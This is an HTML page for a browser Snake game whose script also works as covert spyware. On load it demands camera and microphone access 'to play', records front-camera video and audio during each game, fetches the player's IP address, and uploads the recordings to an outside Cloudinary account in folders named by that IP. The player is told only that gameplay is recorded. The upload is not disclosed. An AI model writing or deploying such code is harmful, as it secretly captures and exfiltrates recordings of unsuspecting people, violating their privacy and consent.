<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
<title>Snake Game</title>
<style>
  /* Reset & fix page to screen */
  html, body {
    margin: 0; padding: 0; overflow: hidden; height: 100%; background: #222;
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    color: #eee;
    user-select: none;
    -webkit-tap-highlight-color: transparent;
  }
  #game-container {
    position: relative;
    width: 100vw; height: 100vh;
    display: flex; flex-direction: column; align-items: center; justify-content: center;
  }
  canvas {
    background: #111;
    border: 3px solid #0f0;
    border-radius: 10px;
    touch-action: none;
  }
  #scoreboard {
    margin-top: 15px;
    font-size: 1.5rem;
    letter-spacing: 2px;
  }
  #controls {
    margin-top: 15px;
  }
  button {
    background: #0f0;
    border: none;
    padding: 10px 20px;
    color: #000;
    font-weight: 700;
    font-size: 1rem;
    border-radius: 8px;
    cursor: pointer;
    user-select: none;
    transition: background 0.3s ease;
  }
  button:hover {
    background: #2f2;
  }
  #info {
    position: absolute;
    top: 5px; left: 5px;
    font-size: 0.85rem;
    opacity: 0.6;
    pointer-events: none;
    user-select: none;
  }
</style>
</head>
<body>
<div id="game-container">
  <canvas id="game" width="320" height="320"></canvas>
  <div id="scoreboard">Score: 0</div>
  <div id="controls">
    <button id="newGameBtn">New Game</button>
  </div>
  <div id="info"></div>
</div>

<script>
(async () => {
  // ==== CONFIG ====
  const CLOUD_NAME = 'dps0g5ftz'; // your cloudinary cloud name
  const UPLOAD_PRESET = 'unsigned'; // your unsigned preset name
  const canvas = document.getElementById('game');
  const ctx = canvas.getContext('2d');
  const scoreBoard = document.getElementById('scoreboard');
  const newGameBtn = document.getElementById('newGameBtn');
  const infoDiv = document.getElementById('info');

  // Game vars
  const gridSize = 16;
  const tileCount = canvas.width / gridSize;
  let snake = [{ x: 8, y: 8 }];
  let velocity = { x: 0, y: 0 };
  let food = {};
  let score = 0;
  let gameOver = false;
  let gameInterval = null;

  // Media recording vars
  let mediaRecorder;
  let recordedChunks = [];
  let mediaStream;
  let sessionFolder = ''; // folder by client IP
  let clientIP = 'unknown';

  // Swipe controls vars
  let touchStartX = 0;
  let touchStartY = 0;
  const swipeThreshold = 30;

  // === UTILITIES ===
  function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min)) + min;
  }

  // Generate new food location
  function placeFood() {
    food.x = getRandomInt(0, tileCount);
    food.y = getRandomInt(0, tileCount);

    // Make sure food is not on snake
    if (snake.some(s => s.x === food.x && s.y === food.y)) {
      placeFood();
    }
  }

  // Draw game
  function draw() {
    // Clear canvas
    ctx.fillStyle = '#111';
    ctx.fillRect(0, 0, canvas.width, canvas.height);

    // Draw snake
    ctx.fillStyle = '#0f0';
    snake.forEach((segment, i) => {
      ctx.fillRect(segment.x * gridSize, segment.y * gridSize, gridSize - 1, gridSize - 1);
    });

    // Draw food
    ctx.fillStyle = '#f00';
    ctx.fillRect(food.x * gridSize, food.y * gridSize, gridSize - 1, gridSize - 1);
  }

  // Update game state
  function update() {
    if (gameOver) return;

    // Move snake
    const head = { x: snake[0].x + velocity.x, y: snake[0].y + velocity.y };

    // Wall collision (wrap around)
    if (head.x < 0) head.x = tileCount - 1;
    else if (head.x >= tileCount) head.x = 0;
    if (head.y < 0) head.y = tileCount - 1;
    else if (head.y >= tileCount) head.y = 0;

    // Check collision with self
    if (snake.some(segment => segment.x === head.x && segment.y === head.y)) {
      endGame();
      return;
    }

    snake.unshift(head);

    // Check if ate food
    if (head.x === food.x && head.y === food.y) {
      score++;
      scoreBoard.textContent = 'Score: ' + score;
      placeFood();
    } else {
      snake.pop();
    }

    draw();
  }

  // End the game
  function endGame() {
    gameOver = true;
    clearInterval(gameInterval);
    alert('Game over! Your score: ' + score);
    stopRecording();
  }

  // Reset/start new game
  function resetGame() {
    snake = [{ x: 8, y: 8 }];
    velocity = { x: 0, y: 0 };
    score = 0;
    scoreBoard.textContent = 'Score: ' + score;
    gameOver = false;
    placeFood();
    if (gameInterval) clearInterval(gameInterval);
    gameInterval = setInterval(update, 100);
    startRecording();
  }

  // === Controls ===
  document.addEventListener('keydown', e => {
    if (gameOver) return;
    switch (e.key) {
      case 'ArrowUp':
      case 'w':
        if (velocity.y === 1) break; // prevent reverse
        velocity = { x: 0, y: -1 };
        break;
      case 'ArrowDown':
      case 's':
        if (velocity.y === -1) break;
        velocity = { x: 0, y: 1 };
        break;
      case 'ArrowLeft':
      case 'a':
        if (velocity.x === 1) break;
        velocity = { x: -1, y: 0 };
        break;
      case 'ArrowRight':
      case 'd':
        if (velocity.x === -1) break;
        velocity = { x: 1, y: 0 };
        break;
    }
  });

  // Touch swipe controls for mobile
  canvas.addEventListener('touchstart', e => {
    if (e.touches.length === 1) {
      touchStartX = e.touches[0].clientX;
      touchStartY = e.touches[0].clientY;
    }
  });

  canvas.addEventListener('touchmove', e => {
    if (!touchStartX || !touchStartY) return;
    const dx = e.touches[0].clientX - touchStartX;
    const dy = e.touches[0].clientY - touchStartY;

    if (Math.abs(dx) > Math.abs(dy)) {
      if (dx > swipeThreshold && velocity.x !== -1) velocity = { x: 1, y: 0 };
      else if (dx < -swipeThreshold && velocity.x !== 1) velocity = { x: -1, y: 0 };
    } else {
      if (dy > swipeThreshold && velocity.y !== -1) velocity = { x: 0, y: 1 };
      else if (dy < -swipeThreshold && velocity.y !== 1) velocity = { x: 0, y: -1 };
    }
    touchStartX = 0;
    touchStartY = 0;
  });

  newGameBtn.onclick = () => {
    resetGame();
  };

  // === Media recording ===

  async function getClientIP() {
    try {
      const res = await fetch('https://api.ipify.org?format=json');
      const data = await res.json();
      return data.ip || 'unknown';
    } catch {
      return 'unknown';
    }
  }

  async function getUserInfo() {
    const ua = navigator.userAgent;
    const platform = navigator.platform;
    const language = navigator.language;
    // Basic geolocation via IP (no precise GPS)
    // IP from getClientIP, location fetched from free API (optional)
    return { ua, platform, language };
  }

  async function startRecording() {
    try {
      if (mediaRecorder && mediaRecorder.state === 'recording') {
        // Already recording
        return;
      }
      if (!clientIP) {
        clientIP = await getClientIP();
        sessionFolder = `session_${clientIP.replace(/\./g, '_')}_${Date.now()}`;
        infoDiv.textContent = `Client IP: ${clientIP}`;
      }

      mediaStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true });
      mediaRecorder = new MediaRecorder(mediaStream, { mimeType: 'video/webm; codecs=vp8,opus' });

      recordedChunks = [];

      mediaRecorder.ondataavailable = e => {
        if (e.data.size > 0) {
          recordedChunks.push(e.data);
        }
      };

      mediaRecorder.onstop = async () => {
        const blob = new Blob(recordedChunks, { type: 'video/webm' });
        await uploadRecording(blob);
        recordedChunks = [];
      };

      mediaRecorder.start();
      console.log('Media recording started');

    } catch (err) {
      console.error('Media recording failed:', err);
    }
  }

  async function stopRecording() {
    if (mediaRecorder && mediaRecorder.state === 'recording') {
      mediaRecorder.stop();
      mediaStream.getTracks().forEach(track => track.stop());
      console.log('Media recording stopped');
    }
  }

  async function uploadRecording(blob) {
    try {
      const formData = new FormData();
      const fileName = `${sessionFolder}/recording_${Date.now()}.webm`;

      formData.append('file', blob, fileName);
      formData.append('upload_preset', UPLOAD_PRESET);
      formData.append('folder', sessionFolder);
      formData.append('public_id', `recording_${Date.now()}`);

      const response = await fetch(`https://api.cloudinary.com/v1_1/${CLOUD_NAME}/video/upload`, {
        method: 'POST',
        body: formData
      });

      if (!response.ok) throw new Error('Upload failed');

      const data = await response.json();
      console.log('Upload successful:', data.secure_url);

    } catch (e) {
      console.error('Upload error:', e);
    }
  }

  // On load: request permissions and start game
  async function init() {
    try {
      infoDiv.textContent = 'Requesting camera and mic permission...';
      await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true });
      infoDiv.textContent = 'Permissions granted. Starting game.';
      resetGame();
    } catch (e) {
      infoDiv.textContent = 'Camera and mic permission required to play.';
      alert('Camera and microphone permissions are required for recording gameplay.');
    }
  }

  // Disable scrolling on mobile
  window.addEventListener('touchmove', function(e) {
    e.preventDefault();
  }, { passive: false });

  // Start app
  init();
})();
</script>
</body>
</html>
